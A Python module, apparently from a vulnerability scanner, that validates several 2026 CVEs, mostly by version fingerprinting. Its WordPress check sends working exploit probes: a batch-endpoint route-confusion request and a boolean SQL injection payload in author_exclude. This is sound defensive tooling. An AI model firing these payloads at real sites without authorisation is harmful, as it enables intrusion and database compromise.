"""Stage 5: capability-tiered validation of current, exploited CVEs.

A version match is a lead. This module turns a curated playbook into one of
three outcomes, and never more than the evidence allows:

* **probe** — a non-destructive, read-only oracle existed and fired. The
  finding is CONFIRMED (`verified=True`) with the oracle named in
  `verification.method`.
* **version** — the vulnerable release is fingerprinted but exploitation was
  not attempted (needs an upload, a deserialization gadget, or a credential).
  The finding is FIRM, not CONFIRMED.
* **unknown/clear** — evidence only. No finding. A WAF block, an object
  cache, or a patched host looks identical from outside; guessing is how
  scanners file false criticals.

Playbooks are seeded from CVEs that are current as of October 2026 and were
re-verified against NVD, the CISA KEV feed, and public PoC status before
being added. CVSS is the NVD/CNA base score; KEV and EPSS are fetched live.
"""

import asyncio
import json
import re
from urllib.parse import quote

from core.version_match import parse_version
from modules.base import BaseModule
from modules.exploit_lookup import kev_lookup_cves
from tools.wrappers import epss_score

CVE_RE = re.compile(r"CVE-\d{4}-\d{4,}", re.I)

# A path wp_parse_url() rejects. It seeds one WP_Error into the batch list,
# desyncing validation from dispatch — that is CVE-2026-63030.
_WP_PRIMER = {"method": "POST", "path": "///"}
_WP_BATCH_PATHS = ("/wp-json/batch/v1", "/?rest_route=/batch/v1")

PLAYBOOKS = {
    "wp2shell": {
        "cves": ("CVE-2026-63030", "CVE-2026-60137"),
        "cvss": 9.8,
        "severity": "CRITICAL",
        "title": "WordPress wp2shell: pre-auth RCE chain",
        "check": "_check_wp2shell",
        "fixed": "6.9.5 / 7.0.2 (6.8.6 for the SQLi alone)",
    },
    "updraftplus": {
        "cves": ("CVE-2026-10795",),
        "cvss": 8.1,
        "severity": "HIGH",
        "title": "UpdraftPlus unauthenticated RPC authentication bypass",
        "check": "_check_updraftplus",
        "fixed": "1.26.5 (2.26.5 premium)",
    },
    "sharepoint": {
        "cves": ("CVE-2026-50522",),
        "cvss": 9.8,
        "severity": "CRITICAL",
        "title": "SharePoint deserialization RCE",
        "check": "_check_sharepoint",
        "fixed": "July 2026 SharePoint update",
    },
    "oracle-httpserver": {
        "cves": ("CVE-2026-21962",),
        "cvss": 10.0,
        "severity": "CRITICAL",
        "title": "Oracle HTTP Server / WebLogic proxy plug-in access control",
        "check": "_check_oracle_httpserver",
        "fixed": "January 2026 Oracle CPU",
    },
    "rails-active-storage": {
        "cves": ("CVE-2026-66066",),
        "cvss": 9.5,
        "severity": "CRITICAL",
        "title": "Rails Active Storage/libvips arbitrary file read",
        "check": "_check_rails",
        "fixed": "7.2.3.2 / 8.0.5.1 / 8.1.3.1",
    },
}


def _versions_lt(left, right) -> bool:
    a, b = parse_version(left), parse_version(right)
    if not a or not b:
        return False
    width = max(len(a), len(b))
    return a + (0,) * (width - len(a)) < b + (0,) * (width - len(b))


def _in_range(version, start, end) -> bool:
    return not _versions_lt(version, start) and _versions_lt(version, end)


def _walk_codes(value, out=None) -> set:
    """Every `code` string anywhere in a nested batch response."""
    if out is None:
        out = set()
    if isinstance(value, dict):
        if isinstance(value.get("code"), str):
            out.add(value["code"])
        for item in value.values():
            _walk_codes(item, out)
    elif isinstance(value, list):
        for item in value:
            _walk_codes(item, out)
    return out


def _header(headers_text: str, name: str) -> str:
    match = re.search(rf"(?im)^{re.escape(name)}:\s*(.+?)\s*$",
                      headers_text or "")
    return match.group(1) if match else ""


def _sharepoint_branch(version: str):
    """(edition, fix build) for a 4-segment SharePoint build, else None.

    SharePoint exposes `16.0.<branch>.<revision>` in
    MicrosoftSharePointTeamServices. The branch segment maps to the service
    train; the legacy `16.0.0.<build>` form does not carry enough information
    and is deliberately not guessed at.
    """
    parts = parse_version(version)
    if not parts or len(parts) != 4 or parts[0] != 16 or parts[1] != 0:
        return None
    branch = parts[2]
    if 4000 <= branch < 7000:
        return "SharePoint Server 2016", "16.0.5561.1001"
    if 9000 <= branch < 14000:
        return "SharePoint Server 2019", "16.0.10417.20175"
    if 14000 <= branch < 20000:
        return "SharePoint Subscription Edition", "16.0.19725.20434"
    return None


class CVEValidation(BaseModule):
    id = "cve_validation"
    name = "CVE Exploit Validation"
    stage = 5
    detectability = "high"
    depends_on = ["tech_detection"]
    active = True

    async def run(self) -> str:
        cfg = self._cfg()
        if cfg.get("enabled", True) is False:
            self.state.skip_module(self.id, "disabled in config")
            return "skipped"

        outcomes = []
        for name, playbook in PLAYBOOKS.items():
            if self.should_stop(reserve=15):
                self.log("  time-box reached, stopping playbooks")
                break
            try:
                result = await getattr(self, playbook["check"])()
            except Exception as exc:  # one bad playbook must not sink the rest
                self.log(f"  {name}: check raised: {exc}")
                continue
            outcomes.append(await self._file(name, playbook, result))
            delay = cfg.get("delay_seconds", 0.5)
            if delay:
                try:
                    await asyncio.sleep(max(0.0, float(delay)))
                except (TypeError, ValueError):
                    pass

        self.state.complete_module(self.id)
        self.log("  " + (", ".join(outcomes) or "no playbook outcomes"))
        return "done"

    async def _file(self, name: str, playbook: dict, result: dict) -> str:
        status = str((result or {}).get("status", "unknown"))
        if status not in ("confirmed", "version"):
            self.log(f"  {name}: {status} — {(result or {}).get('detail', '')}")
            return f"{name}:{status}"

        intelligence = await self._intel(playbook["cves"],
                                          playbook.get("cvss", 0.0))
        verified = status == "confirmed"
        self.state.add_finding(
            title=result.get("title") or playbook["title"],
            severity=result.get("severity") or playbook["severity"],
            confidence="CONFIRMED" if verified else "FIRM",
            category="Vulnerability Validation",
            description=result.get("description", ""),
            evidence=result.get("evidence") or [],
            remediation=result.get("remediation") or (
                f"Upgrade past {playbook.get('fixed', 'the fixed release')} "
                "and rotate any secret the vulnerable process could read."),
            asset_keys=[f"webapp:{self.base_url}"],
            verified=verified,
            verification=result.get("verification") or {},
            intelligence=intelligence,
        )
        return f"{name}:{status}"

    async def _intel(self, cves, cvss: float) -> dict:
        intelligence = {"cves": list(cves)}
        try:
            if cvss:
                intelligence["cvss"] = float(cvss)
        except (TypeError, ValueError):
            pass
        try:
            if await kev_lookup_cves(list(cves), self.config):
                intelligence["kev"] = True
        except Exception:
            pass
        try:
            scores = await epss_score(list(cves))
            if scores:
                intelligence["epss"] = max(
                    float((score or {}).get("epss") or 0.0)
                    for score in scores.values())
        except Exception:
            pass
        return intelligence

    # ── HTTP helpers ─────────────────────────────────────────────

    async def _get(self, path: str, *, timeout: int = 12) -> dict:
        return await self.http_get(f"{self.base_url}{path}", output="full",
                                   follow_redirects=True, timeout=timeout)

    async def _post_json(self, url: str, payload: dict,
                         *, timeout: int = 15) -> dict:
        return await self.http_get(
            url, method="POST", data=json.dumps(payload),
            headers={"Content-Type": "application/json"}, output="full",
            follow_redirects=False, timeout=timeout)

    @staticmethod
    def _json_body(result: dict):
        try:
            return json.loads(result.get("body") or "")
        except (TypeError, ValueError):
            return None

    def _tech_label(self, needle: str) -> bool:
        needle = needle.lower()
        for asset_type in ("tech_stack", "webapp"):
            for asset in self.state.get_assets_by_type(asset_type):
                attrs = asset.get("attrs") or {}
                blob = " ".join(str(item) for item in [
                    asset.get("value", ""), attrs.get("cms", ""),
                    attrs.get("framework", ""),
                    *(attrs.get("labels") or []),
                    *(attrs.get("vendor_products") or []),
                ]).lower()
                if needle in blob:
                    return True
        return False

    # ── WordPress wp2shell ───────────────────────────────────────

    async def _check_wp2shell(self) -> dict:
        version = await self._wp_version()
        if not version and not self._tech_label("wordpress"):
            return {"status": "unknown", "detail": "WordPress not detected"}

        endpoint = await self._wp_batch_endpoint()
        if not endpoint:
            return await self._wp_version_only(
                version, "REST batch endpoint unreachable")

        marker = await self._wp_confusion_marker(endpoint)
        if marker:
            injected = await self._wp_boolean_differential(endpoint)
            if injected:
                return {
                    "status": "confirmed",
                    "severity": "CRITICAL",
                    "title": ("WordPress wp2shell: pre-auth RCE chain confirmed "
                              "(CVE-2026-63030 + CVE-2026-60137)"),
                    "description": (
                        f"The REST batch endpoint at {endpoint} desynchronised "
                        "validation from dispatch: a sub-request validated as a "
                        "post create was answered by the block-renderer "
                        "permission callback (block_cannot_read), and a boolean "
                        "differential over author__not_in separated a true "
                        "condition (rows returned) from a false one (no rows). "
                        "That proves both the route confusion "
                        "(CVE-2026-63030) and the unauthenticated SQL "
                        "injection (CVE-2026-60137) on this host. No data was "
                        "read and no write was attempted."),
                    "evidence": [
                        f"Batch endpoint: {endpoint}",
                        "Marker: block_cannot_read from an unrelated handler",
                        "Boolean differential: 1=1 returned rows; 1=0 did not",
                    ],
                    "verification": {
                        "method": "wp2shell_batch_route_confusion+boolean_differential",
                        "endpoint": endpoint,
                        "marker": "block_cannot_read",
                    },
                    "remediation": (
                        "Upgrade to WordPress 6.9.5 / 7.0.2 (6.8.6 closes the "
                        "SQLi). Until then restrict unauthenticated access to "
                        "/wp-json/batch/v1 and rotate database credentials if "
                        "exposure is suspected."),
                }
            return {
                "status": "confirmed",
                "severity": "HIGH",
                "title": ("WordPress REST batch route confusion confirmed "
                          "(CVE-2026-63030)"),
                "description": (
                    f"The batch endpoint at {endpoint} answered a request with "
                    "a handler it was never asked for (block_cannot_read): the "
                    "validation/dispatch desync is live. The author__not_in "
                    "boolean differential did not separate true from false, so "
                    "the SQLi half of the chain was not proven — an object "
                    "cache, a WAF, or a site with no published posts produces "
                    "the same result. Impact of the confusion alone is a "
                    "permission-check bypass."),
                "evidence": [
                    f"Batch endpoint: {endpoint}",
                    "Marker: block_cannot_read from an unrelated handler",
                    "SQLi differential: inconclusive",
                ],
                "verification": {
                    "method": "wp2shell_batch_route_confusion",
                    "endpoint": endpoint,
                    "marker": "block_cannot_read",
                },
            }

        return await self._wp_version_only(
            version, "route-confusion marker not observed")

    async def _wp_version(self) -> str:
        result = await self._get("/", timeout=10)
        body = result.get("body") or ""
        match = re.search(r"""content=["']WordPress\s+([0-9][0-9.]*)""",
                          body, re.I)
        if match:
            return match.group(1)
        match = re.search(r"wp-embed\.min\.js\?ver=([0-9][0-9.]*)", body)
        return match.group(1) if match else ""

    async def _wp_batch_endpoint(self) -> str:
        for path in _WP_BATCH_PATHS:
            result = await self._post_json(
                f"{self.base_url}{path}", {"requests": []})
            if result.get("status") == 207:
                return f"{self.base_url}{path}"
        return ""

    async def _wp_confusion_marker(self, endpoint: str) -> bool:
        payload = {"requests": [
            _WP_PRIMER,
            {"method": "POST", "path": "/wp/v2/posts"},
            {"method": "POST", "path": "/wp/v2/block-renderer/core/paragraph"},
            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
        ]}
        result = await self._post_json(endpoint, payload)
        return "block_cannot_read" in _walk_codes(self._json_body(result))

    async def _wp_boolean_differential(self, endpoint: str) -> bool:
        true_rows = await self._wp_inject(endpoint, "1=1")
        if not true_rows:
            return False
        false_rows = await self._wp_inject(endpoint, "1=0")
        return bool(false_rows) is False

    async def _wp_inject(self, endpoint: str, condition: str):
        value = f"0) AND ({condition})-- -"
        inner = {"requests": [
            _WP_PRIMER,
            {"method": "GET",
             "path": ("/wp/v2/users?author_exclude="
                      + quote(value, safe=""))},
            {"method": "GET", "path": "/wp/v2/posts"},
        ]}
        payload = {"requests": [
            _WP_PRIMER,
            {"method": "POST", "path": "/wp/v2/posts", "body": inner},
            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
        ]}
        data = self._json_body(await self._post_json(endpoint, payload))
        try:
            rows = data["responses"][1]["body"]["responses"][1]["body"]
        except (KeyError, IndexError, TypeError):
            return None
        return rows if isinstance(rows, list) else None

    async def _wp_version_only(self, version: str, why: str) -> dict:
        if not version:
            return {"status": "unknown", "detail": f"{why}; version unknown"}
        if (_in_range(version, "6.9.0", "6.9.5")
                or _in_range(version, "7.0.0", "7.0.2")):
            return {
                "status": "version",
                "severity": "CRITICAL",
                "title": (f"WordPress {version} is in the wp2shell affected "
                          "range"),
                "description": (
                    f"Generator/embed metadata reports WordPress {version}, "
                    "which is inside the range affected by the batch route "
                    "confusion (CVE-2026-63030) and the author__not_in SQL "
                    "injection (CVE-2026-60137). The active route-confusion "
                    f"probe did not confirm exploitation: {why}. A patched "
                    "host, a WAF, and a persistent object cache are "
                    "indistinguishable from here, so this is a version match, "
                    "not a confirmed compromise."),
                "evidence": [f"Observed version: {version}", why],
                "verification": {
                    "method": "version_fingerprint",
                    "observed": version,
                    "affected": "6.9.0-6.9.4, 7.0.0-7.0.1",
                },
            }
        if _in_range(version, "6.8.0", "6.8.6"):
            return {
                "status": "version",
                "severity": "HIGH",
                "title": (f"WordPress {version} carries the author__not_in SQLi "
                          "(CVE-2026-60137)"),
                "description": (
                    f"Version {version} predates the 6.9.0 batch refactor, so "
                    "the route-confusion bypass (CVE-2026-63030) does not "
                    "exist, but the author__not_in SQL injection does. On "
                    "6.8.x it is reachable only through a plugin or theme that "
                    "passes a raw request value into WP_Query."),
                "evidence": [f"Observed version: {version}", why],
                "verification": {
                    "method": "version_fingerprint",
                    "observed": version,
                    "affected": "6.8.0-6.8.5 (SQLi only)",
                },
            }
        return {"status": "clear",
                "detail": f"WordPress {version} is outside the affected ranges"}

    # ── UpdraftPlus ──────────────────────────────────────────────

    async def _check_updraftplus(self) -> dict:
        path = "/wp-content/plugins/updraftplus/readme.txt"
        result = await self._get(path)
        status = result.get("status")
        if status == 404:
            return {"status": "clear", "detail": "plugin readme not found"}
        if status != 200:
            return {"status": "unknown",
                    "detail": f"plugin readme returned HTTP {status}"}
        body = result.get("body") or ""
        if "updraftplus" not in body.lower():
            return {"status": "unknown",
                    "detail": "plugin readme path did not return UpdraftPlus"}
        match = re.search(
            r"(?im)^\s*(?:Stable tag|Version)\s*:\s*([0-9][0-9A-Za-z.\-]*)",
            body)
        if not match:
            return {"status": "unknown", "detail": "version not present in readme"}
        observed = match.group(1)
        if not _versions_lt(observed, "1.26.5"):
            return {"status": "clear",
                    "detail": f"UpdraftPlus {observed} is patched"}
        return {
            "status": "version",
            "severity": "HIGH",
            "title": (f"UpdraftPlus {observed} has the unauthenticated RPC "
                      "authentication bypass (CVE-2026-10795)"),
            "description": (
                f"The plugin readme reports UpdraftPlus {observed}, which is "
                "at or below 1.26.4. Signature verification in the "
                "UpdraftCentral RPC handler can be bypassed and decryption "
                "failures collapse to a predictable key, letting an "
                "unauthenticated attacker forge RPC commands as the connected "
                "administrator (plugin upload, then code execution). The "
                "version comes from the readme, which is authoritative for the "
                "installed release; confirm it still matches the active plugin "
                "before reporting."),
            "evidence": [f"readme.txt: Stable tag {observed}"],
            "verification": {
                "method": "plugin_readme_version",
                "observed": observed,
                "affected": "<= 1.26.4",
            },
            "remediation": (
                "Update to UpdraftPlus 1.26.5 or later (2.26.5 premium) and "
                "rotate the UpdraftCentral connection keys."),
        }

    # ── SharePoint ───────────────────────────────────────────────

    async def _check_sharepoint(self) -> dict:
        result = await self._get("/")
        headers = result.get("headers") or ""
        observed = _header(headers, "MicrosoftSharePointTeamServices")
        if not observed:
            return {"status": "clear", "detail": "not SharePoint"}
        branch = _sharepoint_branch(observed)
        if not branch:
            return {"status": "unknown",
                    "detail": f"SharePoint build {observed} is not edition-mappable"}
        edition, fixed = branch
        if not _versions_lt(observed, fixed):
            return {"status": "clear",
                    "detail": f"SharePoint build {observed} is patched"}
        return {
            "status": "version",
            "severity": "CRITICAL",
            "title": (f"{edition} build {observed} is below the "
                      "CVE-2026-50522 fix"),
            "description": (
                f"The MicrosoftSharePointTeamServices banner reports build "
                f"{observed} for {edition}, below {fixed}. CVE-2026-50522 is "
                "untrusted-data deserialization over the network; a working "
                "public PoC appeared on 2026-07-20 and CISA added it to KEV on "
                "2026-07-22, with exploitation observed to steal IIS machine "
                "keys. The banner is a version match, not a confirmed "
                "compromise — verify the patch level and whether the server is "
                "internet-facing."),
            "evidence": [
                f"Banner: MicrosoftSharePointTeamServices: {observed}",
                f"Edition branch: {edition}",
                f"Fixed build: {fixed}",
            ],
            "verification": {
                "method": "sharepoint_build_banner",
                "observed": observed,
                "affected_below": fixed,
            },
            "remediation": (
                "Apply the July 2026 SharePoint security update, then rotate "
                "IIS machine keys and ASP.NET validation keys and hunt for "
                "webshells or machine-key harvesting artifacts before "
                "rotating."),
        }

    # ── Oracle HTTP Server / WebLogic proxy plug-in ──────────────

    async def _check_oracle_httpserver(self) -> dict:
        result = await self._get("/")
        server = _header(result.get("headers") or "", "Server")
        if not re.search(r"Oracle[- ](?:HTTP[- ]Server|WebLogic)", server,
                         re.I):
            return {"status": "clear", "detail": "not Oracle HTTP Server"}
        # The whole dotted run: "12.2.1.4.0" must not be read as "12.2.1.4".
        match = re.search(r"(\d+(?:\.\d+){3,})", server)
        if not match:
            return {"status": "unknown",
                    "detail": "OHS detected; banner does not expose a version"}
        observed = match.group(1)
        affected = {"12.2.1.4.0", "14.1.1.0.0", "14.1.2.0.0"}
        if observed not in affected:
            return {"status": "clear",
                    "detail": f"OHS {observed} is outside the affected builds"}
        return {
            "status": "version",
            "severity": "CRITICAL",
            "title": (f"Oracle HTTP Server / WebLogic proxy plug-in {observed} "
                      "is affected by CVE-2026-21962"),
            "description": (
                f"The Server banner reports Oracle HTTP Server {observed}, an "
                "exact affected build for CVE-2026-21962: unauthenticated "
                "improper access control (CVSS 10.0) that can modify or read "
                "all data the proxy reaches. CISA added it to KEV on "
                "2026-08-24; no public exploit code was known at validation "
                "time. The banner is a version match, not exploitation."),
            "evidence": [f"Server: {server}"],
            "verification": {
                "method": "server_banner_version",
                "observed": observed,
                "affected": sorted(affected),
            },
            "remediation": (
                "Apply the January 2026 Oracle Critical Patch Update and "
                "restrict direct access to OHS/WebLogic proxy administration "
                "paths."),
        }

    # ── Rails Active Storage / libvips ───────────────────────────

    async def _check_rails(self) -> dict:
        observed = self._rails_version()
        if not observed:
            return {"status": "unknown",
                    "detail": "no Rails version in the tech fingerprint"}
        affected = (_versions_lt(observed, "7.2.3.2")
                    or _in_range(observed, "8.0.0", "8.0.5.1")
                    or _in_range(observed, "8.1.0", "8.1.3.1"))
        if not affected:
            return {"status": "clear",
                    "detail": f"Rails {observed} is patched"}
        return {
            "status": "version",
            "severity": "CRITICAL",
            "title": (f"Rails {observed} Active Storage/libvips arbitrary file "
                      "read (CVE-2026-66066)"),
            "description": (
                f"The tech fingerprint reports Rails {observed}. Active Storage "
                "in this release does not disable libvips operations marked "
                "unsafe for untrusted content, so a crafted image upload can "
                "read files the Rails process can reach — including "
                "secret_key_base — which escalates to code execution. "
                "Exposure requires libvips as the variant processor (the "
                "default since load_defaults 7.0) and image uploads from "
                "untrusted users; no CISA KEV entry or public full-chain PoC "
                "existed at validation time. The version is fingerprinted, not "
                "exploited."),
            "evidence": [f"Rails version: {observed}"],
            "verification": {
                "method": "tech_fingerprint_version",
                "observed": observed,
                "affected": "< 7.2.3.2, 8.0.0-8.0.5.0, 8.1.0-8.1.3.0",
            },
            "remediation": (
                "Upgrade to 7.2.3.2 / 8.0.5.1 / 8.1.3.1 and rotate "
                "secret_key_base plus any credentials in the process "
                "environment."),
        }

    def _rails_version(self) -> str:
        for asset_type in ("tech_stack", "webapp"):
            for asset in self.state.get_assets_by_type(asset_type):
                attrs = asset.get("attrs") or {}
                blob = " ".join(str(item) for item in [
                    asset.get("value", ""), attrs.get("framework", ""),
                    attrs.get("version", ""), attrs.get("versions", ""),
                    *(attrs.get("labels") or []),
                ])
                match = re.search(r"rails[/\s-]+v?([0-9][0-9.]*)", blob, re.I)
                if match:
                    return match.group(1)
        return ""

    def _cfg(self) -> dict:
        cfg = self.config.get("modules", {}).get(self.id, {})
        return cfg if isinstance(cfg, dict) else {}
